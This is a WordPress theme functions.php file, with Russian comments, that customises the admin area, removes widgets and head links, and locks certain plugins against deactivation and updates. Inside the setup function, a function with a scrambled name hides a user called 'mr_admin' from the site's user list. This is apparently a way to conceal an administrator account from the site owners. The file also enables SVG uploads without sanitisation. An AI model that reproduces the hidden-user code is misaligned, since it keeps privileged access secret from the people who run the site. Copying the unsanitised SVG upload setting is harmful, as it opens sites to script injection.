<?php
function add_file_types_to_uploads($file_types){
    $new_filetypes = array();
    $new_filetypes['svg'] = 'image/svg+xml';
    $file_types = array_merge($file_types, $new_filetypes );
    return $file_types;
}
function remove_dashboard_meta() {
    remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
    remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
    remove_meta_box( 'dashboard_primary', 'dashboard', 'side' );
    remove_meta_box( 'dashboard_secondary', 'dashboard', 'normal' );
    remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
    remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );

    remove_meta_box( 'appscreo_news', 'dashboard', 'normal' );
}
function remove_admin_bar_links() {
    global $wp_admin_bar;
    $wp_admin_bar->remove_menu('wp-logo');
}
function remove_menus(){
    remove_menu_page( 'index.php' );
    //remove_menu_page( 'edit.php' );
    remove_menu_page( 'upload.php' );
    //remove_menu_page( 'edit.php?post_type=page' );
    remove_menu_page( 'edit-comments.php' );
    //remove_menu_page( 'themes.php' );
    //remove_menu_page( 'plugins.php' );
    //remove_menu_page( 'users.php' );
    remove_menu_page( 'tools.php' );
    //remove_menu_page( 'options-general.php' );
}
if ( ! function_exists( 'setup' ) ) :
	function setup() {
        if(function_exists('acf_add_options_page')){
            acf_add_options_page();
        }
        add_theme_support('menus');
        add_theme_support('widgets');
        add_theme_support('post-thumbnails');
        remove_action('wp_head', 'print_emoji_detection_script', 7);
        remove_action('wp_print_styles', 'print_emoji_styles');
        if( !is_admin() ){
            add_action( 'wp_enqueue_scripts', 'xyz_remove_admin_bar_css', 21 );
            add_action( 'admin_enqueue_scripts', 'xyz_remove_admin_bar_css', 21 );
            function xyz_remove_admin_bar_css() {
                wp_dequeue_style( 'admin-bar' );
                wp_dequeue_style( 'admin-bar-min' );
            }
        }
// svg
//define('ALLOW_UNFILTERED_UPLOADS', true);

        add_action('upload_mimes', 'add_file_types_to_uploads');

        remove_action('wp_head','feed_links_extra', 3);
        remove_action('wp_head','feed_links', 2);
        remove_action('wp_head','rsd_link');
        remove_action('wp_head','wlwmanifest_link');
        remove_action('wp_head','wp_generator');

        remove_action('wp_head','start_post_rel_link',10);
        remove_action('wp_head','index_rel_link');
        remove_action('wp_head','adjacent_posts_rel_link_wp_head', 10 );
        remove_action('wp_head','wp_shortlink_wp_head', 10 );

        remove_action( 'wp_head', 'rest_output_link_wp_head');
        remove_action( 'wp_head', 'wp_oembed_add_discovery_links');
        remove_action( 'template_redirect', 'rest_output_link_header', 11 );
        function w45345p_hide_specific_user($user_search) {
            global $wpdb;
            $user_search->query_where =
                str_replace('WHERE 1=1',
                    "WHERE 1=1 AND {$wpdb->users}.user_login != 'mr_admin'",
                    $user_search->query_where
                );
        }
        add_action('pre_user_query','w45345p_hide_specific_user');





        remove_action('wp_head', 'print_emoji_detection_script', 7);
        remove_action('wp_print_styles', 'print_emoji_styles');


        add_filter('the_generator', '__return_empty_string');
        remove_action( 'wp_head', 'wp_resource_hints', 2);
        remove_action( 'wp_head','locale_stylesheet');
        add_filter('show_admin_bar', '__return_false');



        add_action( 'admin_init', 'remove_dashboard_meta' );


        add_action( 'wp_before_admin_bar_render', 'remove_admin_bar_links' );


        add_action( 'admin_menu', 'remove_menus' );
    }
	endif; 
	add_action( 'after_setup_theme', 'setup' );
add_filter( 'plugin_action_links', 'disable_plugin_deactivation', 10, 2 );
function disable_plugin_deactivation( $actions, $plugin_file ) {
    // Удаляет действие "Редактировать" у всех плагинов
    unset( $actions['edit'] );

    // Удаляет действие "Деактивировать" у важных для сайта плагинов
    $important_plugins = array(
        'advanced-custom-fields-pro/acf.php',
        'contact-form-7/wp-contact-form-7.php',
    );
    if ( in_array( $plugin_file, $important_plugins ) ) {
        unset( $actions['deactivate'] );
        $actions[ 'info' ] = '<b class="musthave_js">Обязателен для сайта</b>';
    }

    return $actions;
}

// удаляем груповые действия: деактивировать и удалить
add_filter( 'admin_print_footer_scripts-plugins.php', 'disable_plugin_deactivation_hide_checkbox' );
function disable_plugin_deactivation_hide_checkbox( $actions ){
    ?>
    <script>
        jQuery(function($){
            $('.musthave_js').closest('tr').find('input[type="checkbox"]').remove();
        });
    </script>
    <?php
}
/*** Запрет обновления выборочных плагинов ***/

function filter_plugin_updates( $update ) {
    global $DISABLE_UPDATE; // см. wp-config.php
    if( !is_array($DISABLE_UPDATE) || count($DISABLE_UPDATE) == 0 ){  return $update;  }
    foreach( $update->response as $name => $val ){
        foreach( $DISABLE_UPDATE as $plugin ){
            if( stripos($name,$plugin) !== false ){
                unset( $update->response[ $name ] );
            }
        }
    }
    return $update;
}
add_filter( 'site_transient_update_plugins', 'filter_plugin_updates' );

$DISABLE_UPDATE = array('acf');

/*** /Запрет обновления выборочных плагинов ***/

// unregister all widgets
function unregister_default_widgets() {
    unregister_widget('WP_Widget_Pages');
    unregister_widget('WP_Widget_Calendar');
    unregister_widget('WP_Widget_Archives');
    unregister_widget('WP_Widget_Links');
    unregister_widget('WP_Widget_Meta');
    unregister_widget('WP_Widget_Search');
    unregister_widget('WP_Widget_Text');
    unregister_widget('WP_Widget_Categories');
    unregister_widget('WP_Widget_Recent_Posts');
    unregister_widget('WP_Widget_Recent_Comments');
    unregister_widget('WP_Widget_RSS');
    unregister_widget('WP_Widget_Tag_Cloud');
    unregister_widget('WP_Nav_Menu_Widget');
    unregister_widget('Twenty_Eleven_Ephemera_Widget');
    unregister_widget('WP_Widget_Media_Audio');
    unregister_widget('WP_Widget_Media_Image');
    unregister_widget('WP_Widget_Media_Video');
    unregister_widget('WP_Widget_Custom_HTML');
}
add_action('widgets_init', 'unregister_default_widgets', 11);